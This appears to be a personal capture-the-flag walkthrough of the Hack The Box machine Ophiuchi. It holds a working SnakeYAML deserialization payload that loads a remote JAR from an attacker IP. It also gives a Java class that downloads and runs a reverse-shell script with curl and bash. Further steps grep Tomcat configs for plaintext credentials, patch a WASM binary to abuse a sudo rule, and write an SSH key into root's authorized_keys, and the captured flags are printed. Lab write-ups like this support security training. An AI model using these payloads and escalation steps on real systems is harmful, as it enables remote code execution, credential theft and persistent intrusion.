# Ophiuchi
## nmap 

![[Screenshot 2021-02-15 at 12.02.45 PM.png]]

## Web page

![[Screenshot 2021-02-15 at 12.03.04 PM.png]]

Its an YAML parser, which seems to be broken, as said: due to security reasons. 

## Exploit 

https://github.com/artsploit/yaml-payload

Testing it. 
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.33"]
  ]]
]
```

This exploits works. 

![[Screenshot 2021-02-15 at 12.22.05 PM.png]]

Now we can upload a reverse shell and execute it.


Modify the file AwesomeScriptEngineFactory.java.

![[Screenshot 2021-02-15 at 12.27.15 PM.png]]

AwesomeScriptEngineFactory.java: 

```java

package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http//:10.10.14.33/shell.sh -o /tmp/shell.sh");
	    Runtime.getRuntime().exec("chmod +x /tmp/shell.sh");
            Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

```

Build the exploit. 

![[Screenshot 2021-02-15 at 12.30.00 PM.png]]

Now send the exploit. 

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.33/yaml-payload.jar"]
  ]]
]
```

Listen on port

We got a rev shell but as tomcat user. 

![[Screenshot 2021-02-15 at 1.03.45 PM.png]]

Cant access the user flag of User admin.

## User 
navigate to /opt/tomcat/conf
![[Screenshot 2021-02-15 at 1.12.02 PM.png]]

`cat * | grep "pass"`

![[Screenshot 2021-02-15 at 1.11.40 PM.png]]

`<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>`

admin:whythereisalimit

after chainging the user you wont see a shell but you have a shell

![[Screenshot 2021-02-15 at 1.14.42 PM.png]]

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![[Screenshot 2021-02-15 at 1.16.29 PM.png]]

got the user flag

![[Screenshot 2021-02-15 at 1.17.59 PM.png]]

User flag === a933e662291b03fd56d049b8cd125723

## Root
`sudo -l`

![[Screenshot 2021-02-15 at 1.24.19 PM.png]]

`/usr/bin/go run /opt/wasm-functions/index.go`

ssh into server to get the files

`ssh admin@10.10.10.227`

![[Screenshot 2021-02-15 at 1.31.28 PM.png]]

`cat /opt/wasm-functions/index.go`

![[Screenshot 2021-02-15 at 2.38.45 PM.png]]

Here it check if the results is 1 or not. If 1, then deploy.sh is executed. 

To change this

Get the file main.wasm
![[Screenshot 2021-02-15 at 2.49.09 PM.png]]

https://github.com/WebAssembly/wabt
upload the file in the web: https://webassembly.github.io/wabt/demo/wasm2wat/

change the file, make 0 to 1

![[Screenshot 2021-02-15 at 2.52.59 PM.png]]

copy and paste the modified code from here https://webassembly.github.io/wabt/demo/wat2wasm/index.html

![[Screenshot 2021-02-15 at 3.01.23 PM.png]]

rename to main.wasm

upload the /tmp/ directory 

create a deploy.sh and add your public ssh keys init. 

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaR6ekuXPy8DQYzygkYg52OWKjhUNYtg/t6X..." > /root/.ssh/authorized_keys
```

upload deploy.sh to /tmp/

and run 
`sudo /usr/bin/go run /opt/wasm-functions/index.go`

![[Screenshot 2021-02-15 at 3.29.17 PM.png]]

Now ssh into the machine using ur keys. 

![[Screenshot 2021-02-15 at 3.30.19 PM.png]]

Got root.

![[Screenshot 2021-02-15 at 3.23.11 PM.png]]
root flag === 1d9de0287979d6aaf5c0064ea51ce481